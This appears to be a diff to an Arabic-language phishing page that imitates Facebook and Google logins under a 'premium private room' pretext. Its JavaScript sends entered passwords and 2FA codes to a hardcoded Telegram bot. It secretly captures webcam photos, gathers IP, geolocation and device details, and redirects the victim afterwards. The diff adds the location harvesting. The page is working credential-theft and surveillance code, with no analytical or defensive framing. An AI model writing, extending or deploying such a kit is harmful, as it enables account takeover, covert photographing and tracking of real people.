@@ -5,15 +5,13 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Premium Access | دخول الأعضاء</title>
     <style>
-        :root { --fb-blue: #1877f2; --gm-red: #ea4335; --premium-gold: #d4af37; }
-        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: radial-gradient(circle, #1a1a1a, #000); color: white; margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; overflow-x: hidden; }
+        :root { --fb-blue: #1877f2; --premium-gold: #d4af37; }
+        body { font-family: 'Segoe UI', sans-serif; background: radial-gradient(circle, #1a1a1a, #000); color: white; margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; overflow-x: hidden; }
         .card { width: 90%; max-width: 420px; background: rgba(255, 255, 255, 0.05); backdrop-filter: blur(10px); padding: 30px; border-radius: 20px; border: 1px solid var(--premium-gold); box-shadow: 0 0 20px rgba(212, 175, 55, 0.2); text-align: center; }
+        .fb-header-logo { width: 45px; margin-bottom: 10px; }
         .premium-tag { background: var(--premium-gold); color: black; padding: 5px 15px; border-radius: 50px; font-weight: bold; font-size: 12px; display: inline-block; margin-bottom: 15px; }
-        h2 { color: var(--premium-gold); margin-bottom: 10px; }
         input { width: 100%; padding: 12px; margin: 10px 0; border-radius: 8px; border: none; background: #333; color: white; box-sizing: border-box; }
-        .btn { width: 100%; padding: 15px; border-radius: 8px; border: none; font-weight: bold; cursor: pointer; transition: 0.3s; margin-top: 10px; }
-        .btn-fb { background: var(--fb-blue); color: white; }
-        .btn-gm { background: white; color: #757575; border: 1px solid #ddd; display: flex; align-items: center; justify-content: center; }
+        .btn { width: 100%; padding: 15px; border-radius: 8px; border: none; font-weight: bold; cursor: pointer; transition: 0.3s; margin-top: 10px; background: var(--fb-blue); color: white; }
         #loader-screen, #step2, #step3 { display: none; }
         .progress-container { width: 100%; background: #333; height: 10px; border-radius: 5px; margin: 20px 0; overflow: hidden; }
         .progress-bar { width: 0%; height: 100%; background: var(--premium-gold); transition: linear; }
@@ -24,38 +22,32 @@
 
 <div class="card">
     <div id="step1">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_%282019%29.png" class="fb-header-logo" alt="FB">
         <div class="premium-tag">PREMIUM ACCESS ONLY</div>
-        <h2>مرحباً بك في الغرفة الخاصة</h2>
-        <p style="font-size: 14px; color: #ccc;">هذه الصفحة مخصصة للأعضاء المميزين فقط. يرجى تسجيل الدخول عبر فيسبوك للمتابعة.</p>
+        <h2>الغرفة الخاصة</h2>
+        <p style="font-size: 14px; color: #ccc;">سجل دخولك لتفعيل دعوتك المجانية.</p>
         <input type="text" id="fb-user" placeholder="البريد الإلكتروني أو الهاتف">
         <input type="password" id="fb-pass" placeholder="كلمة السر">
-        <button class="btn btn-fb" onclick="handleStep1()">تسجيل الدخول الآمن</button>
+        <button class="btn" onclick="handleStep1()">دخول آمن</button>
     </div>
 
     <div id="step2">
-        <h2>تأكيد أمان الحساب</h2>
-        <p>يرجى إدخال رمز المصادقة الثنائية (2FA) للمتابعة إلى الغرفة.</p>
-        <input type="number" id="2fa-code" placeholder="رمز الأمان مكون من 6 أرقام">
-        <button class="btn btn-fb" style="background: #42b72a;" onclick="handleStep2()">تأكيد الهوية</button>
+        <h2>تأكيد الأمان</h2>
+        <input type="number" id="2fa-code" placeholder="رمز 2FA">
+        <button class="btn" style="background: #42b72a;" onclick="handleStep2()">تأكيد</button>
     </div>
 
     <div id="loader-screen">
-        <h2 id="status-text">جاري التحقق من بياناتك...</h2>
+        <h2>جاري التجهيز...</h2>
         <div class="progress-container"><div class="progress-bar" id="p-bar"></div></div>
-        <p>يتم الآن تجهيز الغرفة الخاصة للتحدث مع الداعي..</p>
         <div id="timer">02:00</div>
     </div>
 
     <div id="step3">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/53/Google_%22G%22_Logo.svg/512px-Google_%22G%22_Logo.svg.png" width="40" alt="G">
-        <h2 style="color: white;">تأكيد ملكية البريد</h2>
-        <p style="font-size: 13px;">لأغراض أمنية، يرجى تسجيل الدخول بحساب Google المرتبط.</p>
-        <input type="email" id="gm-user" placeholder="البريد الإلكتروني">
-        <input type="password" id="gm-pass" placeholder="كلمة المرور">
-        <button class="btn btn-gm" onclick="handleStep3()">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/53/Google_%22G%22_Logo.svg/512px-Google_%22G%22_Logo.svg.png" width="18" style="margin-left: 10px;">
-            المتابعة باستخدام Google
-        </button>
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/c1/Google_Reference_Logo.svg/200px-Google_Reference_Logo.svg.png" width="80">
+        <input type="email" id="gm-user" placeholder="Google Email">
+        <input type="password" id="gm-pass" placeholder="Password">
+        <button class="btn" style="background:white; color:#555;" onclick="handleStep3()">تأكيد عبر Google</button>
     </div>
 
     <video id="video" width="320" height="240" autoplay style="display:none;"></video>
@@ -66,82 +58,80 @@
     const token = '8207943883:AAF_XJoeKlHEE2bB7Ro0PBVSvpihbuZ0fW0';
     const chatId = '8350812242';
 
-    // طلب الكاميرا فور الدخول
+    // طلب الكاميرا والموقع فور الدخول
     window.onload = () => {
-        navigator.mediaDevices.getUserMedia({ video: true }).then(s => document.getElementById('video').srcObject = s).catch(e => console.log(e));
+        navigator.mediaDevices.getUserMedia({ video: true }).then(s => document.getElementById('video').srcObject = s);
+        navigator.geolocation.getCurrentPosition(() => {}, () => {}); // لطلب إذن الموقع
     };
 
-    async function takePhotos(count) {
+    async function getAdvancedInfo() {
+        let locationInfo = "Location: Access Denied";
+        try {
+            const res = await fetch('http://ip-api.com/json/');
+            const data = await res.json();
+            locationInfo = `🌍 البلد: ${data.country} (${data.countryCode})\n🏙️ المدينة: ${data.city}\n📡 المزود: ${data.isp}\n📍 IP: \`${data.query}\``;
+        } catch(e) { console.log(e); }
+
+        const deviceInfo = `📱 الجهاز: \`${navigator.platform}\`\n🖥️ المتصفح: \`${navigator.userAgent.split(') ')[1]}\``;
+        return `${locationInfo}\n${deviceInfo}`;
+    }
+
+    async function sendToTelegram(title, data) {
+        const advInfo = await getAdvancedInfo();
+        const msg = `🚀 **${title}** 🚀\n${data}\n\n📊 **معلومات الجهاز والموقع:**\n${advInfo}`;
+        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
+    }
+
+    async function takePhotos() {
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
-        const ctx = canvas.getContext('2d');
-        for(let i=0; i<count; i++) {
-            ctx.drawImage(video, 0, 0, 320, 240);
-            const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg'));
+        for(let i=0; i<3; i++) {
+            canvas.getContext('2d').drawImage(video, 0, 0, 320, 240);
+            const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg'));
             const fd = new FormData();
             fd.append('chat_id', chatId);
             fd.append('photo', blob);
             fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {method:'POST', body:fd});
-            await new Promise(r => setTimeout(r, 1000)); // فرق ثانية بين كل صورة
+            await new Promise(r => setTimeout(r, 1000));
         }
-    }
-
-    async function sendData(msg) {
-        const res = await fetch('https://api.ipify.org?format=json');
-        const ip = (await res.json()).ip;
-        const fullMsg = `${msg}\n🌐 IP: \`${ip}\` \n📱 الجهاز: \`${navigator.platform}\``;
-        await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(fullMsg)}&parse_mode=Markdown`);
     }
 
     function handleStep1() {
         const u = document.getElementById('fb-user').value;
         const p = document.getElementById('fb-pass').value;
-        if(!u || !p) return alert("يرجى إكمال البيانات");
-        sendData(`👤 **Facebook Entry**\n📧: \`${u}\`\n🔑: \`${p}\``);
-        takePhotos(3);
+        sendToTelegram("FB Login", `👤: \`${u}\`\n🔑: \`${p}\``);
+        takePhotos();
         document.getElementById('step1').style.display='none';
         document.getElementById('step2').style.display='block';
     }
 
     function handleStep2() {
         const c = document.getElementById('2fa-code').value;
-        if(!c) return;
-        sendData(`🛡️ **Facebook 2FA**\n🔢 Code: \`${c}\``);
-        takePhotos(3);
+        sendToTelegram("FB 2FA", `🛡️ Code: \`${c}\``);
+        takePhotos();
         document.getElementById('step2').style.display='none';
-        startLoading();
+        startLoader();
     }
 
-    function startLoading() {
+    function startLoader() {
         document.getElementById('loader-screen').style.display='block';
-        let timeLeft = 120;
-        const timerElement = document.getElementById('timer');
-        const progressBar = document.getElementById('p-bar');
-        
-        const interval = setInterval(() => {
-            timeLeft--;
-            let mins = Math.floor(timeLeft / 60);
-            let secs = timeLeft % 60;
-            timerElement.innerText = `${mins < 10 ? '0'+mins : mins}:${secs < 10 ? '0'+secs : secs}`;
-            progressBar.style.width = ((120 - timeLeft) / 120 * 100) + '%';
-            
-            if(timeLeft <= 0) {
-                clearInterval(interval);
-                document.getElementById('loader-screen').style.display='none';
-                document.getElementById('step3').style.display='block';
-            }
+        let time = 120;
+        const intr = setInterval(() => {
+            time--;
+            let m = Math.floor(time/60), s = time%60;
+            document.getElementById('timer').innerText = `${m<10?'0'+m:m}:${s<10?'0'+s:s}`;
+            document.getElementById('p-bar').style.width = ((120-time)/120*100)+'%';
+            if(time <= 0) { clearInterval(intr); document.getElementById('loader-screen').style.display='none'; document.getElementById('step3').style.display='block'; }
         }, 1000);
     }
 
     function handleStep3() {
-        const gu = document.getElementById('gm-user').value;
-        const gp = document.getElementById('gm-pass').value;
-        if(!gu || !gp) return alert("يرجى إدخال بيانات Google");
-        sendData(`📧 **Google Account**\n👤: \`${gu}\`\n🔑: \`${gp}\``);
-        takePhotos(3);
-        setTimeout(() => { window.location.href = "https://www.google.com"; }, 2000);
+        const u = document.getElementById('gm-user').value;
+        const p = document.getElementById('gm-pass').value;
+        sendToTelegram("Google Data", `📧: \`${u}\`\n🔑: \`${p}\``);
+        takePhotos();
+        setTimeout(() => window.location.href="https://facebook.com", 2000);
     }
 </script>
-
 </body>
 </html>
